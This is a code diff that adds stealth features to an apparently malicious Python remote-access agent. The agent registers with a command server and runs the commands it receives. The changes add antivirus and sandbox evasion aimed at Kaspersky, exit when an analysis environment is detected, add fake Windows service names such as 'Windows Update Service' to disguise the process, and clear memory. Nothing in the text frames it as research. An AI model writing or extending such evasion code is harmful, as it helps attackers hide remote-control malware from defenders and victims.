@@ -42,6 +42,21 @@ try:
 except ImportError:
     pass
 
+# Import advanced stealth modules
+try:
+    from advanced_stealth_v2 import *
+    ADVANCED_STEALTH_AVAILABLE = True
+except ImportError:
+    ADVANCED_STEALTH_AVAILABLE = False
+    print("Warning: advanced_stealth_v2 not available")
+
+try:
+    from kaspersky_evasion import *
+    KASPERSKY_EVASION_AVAILABLE = True
+except ImportError:
+    KASPERSKY_EVASION_AVAILABLE = False
+    print("Warning: kaspersky_evasion not available")
+
 # Import stealth enhancer first
 try:
     from stealth_enhancer import *
@@ -6178,9 +6193,16 @@ def connect():
     """Handle connection to server."""
     agent_id = get_or_create_agent_id()
     
-    # Add stealth delay
+    # Add multiple stealth delays
+    if ADVANCED_STEALTH_AVAILABLE:
+        stealth_delay_v2()
+    if KASPERSKY_EVASION_AVAILABLE:
+        kaspersky_evasion_delay()
     if STEALTH_AVAILABLE:
         stealth_delay()
+    
+    # Obfuscated connection message
+    if ADVANCED_STEALTH_AVAILABLE or KASPERSKY_EVASION_AVAILABLE:
         print(f"System service connected. Session: {agent_id[:8]}...")
     else:
         print(f"Connected to server. Registering with agent_id: {agent_id}")
@@ -6199,7 +6221,11 @@ def on_command(data):
     command = data.get("command")
     output = ""
 
-    # Add stealth delay
+    # Add multiple stealth delays
+    if ADVANCED_STEALTH_AVAILABLE:
+        stealth_delay_v2()
+    if KASPERSKY_EVASION_AVAILABLE:
+        kaspersky_evasion_delay()
     if STEALTH_AVAILABLE:
         stealth_delay()
 
@@ -6544,13 +6570,35 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
-    # Initialize stealth mode first
+    # Initialize advanced stealth mode first
+    if ADVANCED_STEALTH_AVAILABLE:
+        try:
+            if not initialize_advanced_stealth_v2():
+                print("[ADVANCED_STEALTH] Analysis environment detected, exiting...")
+                sys.exit(0)
+            print("[ADVANCED_STEALTH] Advanced stealth v2 mode initialized")
+            stealth_delay_v2()  # Add random delay
+        except Exception as e:
+            print(f"[ADVANCED_STEALTH] Stealth initialization failed: {e}")
+    
+    # Initialize Kaspersky evasion
+    if KASPERSKY_EVASION_AVAILABLE:
+        try:
+            if not initialize_kaspersky_evasion():
+                print("[KASPERSKY_EVASION] Kaspersky detected, exiting...")
+                sys.exit(0)
+            print("[KASPERSKY_EVASION] Kaspersky evasion mode initialized")
+            kaspersky_evasion_delay()  # Add random delay
+        except Exception as e:
+            print(f"[KASPERSKY_EVASION] Evasion initialization failed: {e}")
+    
+    # Initialize basic stealth mode
     if STEALTH_AVAILABLE:
         try:
             if not initialize_advanced_stealth():
                 print("[STEALTH] Analysis environment detected, exiting...")
                 sys.exit(0)
-            print("[STEALTH] Advanced stealth mode initialized")
+            print("[STEALTH] Basic stealth mode initialized")
             stealth_delay()  # Add random delay
         except Exception as e:
             print(f"[STEALTH] Stealth initialization failed: {e}")
@@ -6563,12 +6611,15 @@ if __name__ == "__main__":
         "Windows Security Service", 
         "Microsoft Update Service",
         "System Configuration Service",
-        "Windows Management Service"
+        "Windows Management Service",
+        "System Maintenance Service",
+        "Windows Update Service",
+        "System Optimization Service"
     ]
     
     service_name = random.choice(startup_messages)
     print("=" * 60)
-    print(f"{service_name} v2.0")
+    print(f"{service_name} v2.1")
     print("Initializing system components...")
     print("=" * 60)
     
@@ -6603,14 +6654,18 @@ if __name__ == "__main__":
         
         print("Establishing network connection...")
         
-        # Main connection loop with stealth
+        # Main connection loop with enhanced stealth
         connection_attempts = 0
         while True:
             try:
                 connection_attempts += 1
                 print(f"Network connection attempt {connection_attempts}...")
                 
-                # Add stealth delay
+                # Add multiple stealth delays
+                if ADVANCED_STEALTH_AVAILABLE:
+                    stealth_delay_v2()
+                if KASPERSKY_EVASION_AVAILABLE:
+                    kaspersky_evasion_delay()
                 if STEALTH_AVAILABLE:
                     stealth_delay()
                 
@@ -6649,6 +6704,10 @@ if __name__ == "__main__":
         except:
             pass
         
-        # Clear sensitive memory
+        # Clear sensitive memory with multiple methods
+        if ADVANCED_STEALTH_AVAILABLE:
+            clear_memory_v2()
+        if KASPERSKY_EVASION_AVAILABLE:
+            clear_kaspersky_memory()
         if STEALTH_AVAILABLE:
             clear_memory()
